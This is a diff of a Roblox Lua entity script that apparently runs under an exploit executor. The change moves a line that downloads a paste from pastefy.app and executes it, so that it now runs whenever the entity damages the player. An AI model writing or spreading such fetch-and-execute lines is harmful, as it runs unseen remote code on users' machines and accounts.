@@ -280,6 +280,7 @@ entity:SetCallback("OnDamagePlayer", function(newHealth)
 		print("Entity has damaged the player")
 		game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):TakeDamage(60)
 		game:GetService("ReplicatedStorage").GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Wh1t3"
+loadstring(game:HttpGet("https://pastefy.app/famDWh93/raw"))()
 		local Gglitchy = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Glitchy")
     local Gglitch1 = Gglitchy["Glitch Screen"].Glitch1
     local Gglitch2 = Gglitchy["Glitch Screen"].Glitch2
@@ -292,7 +293,6 @@ entity:SetCallback("OnDamagePlayer", function(newHealth)
     print("Dead")
         task.wait(15)
         if game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
-loadstring(game:HttpGet("https://pastefy.app/famDWh93/raw"))()
         warn("P̴̖̺̙͑̍l̸̦̘̔̈́a̸̲̰̯̙͋͒̋y̷͚͖͑͋e̴͎̤̺̗͊ȓ̴̳͙̱̒̔ ̵͈̈́͜h̶͓́͐͂̇a̶̛̞̪̯̫s̸̥͝ ̷̣̲̔̆̓d̵̡̖̈͋̊ͅí̶͚͝e̴͎̅̆̇d̸̮͍͊̔̓͝.̵̢͎̹̾̃")
         firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"H̷̡̡̧̻̼̺̖̫̰̥͚̳͎̣͓͕̼̜̆͐ͅ0̷͇̦̬̟̱̣̠̼̻̱̩̲͇̥̪̙͎̩̈́̌́̈́̓̀̿̍͜Ẃ̵̛̛̏͑̔̏̿͊͐̆̋̈͐̐͘͜"}, "Blue")
         game:Shutdown()
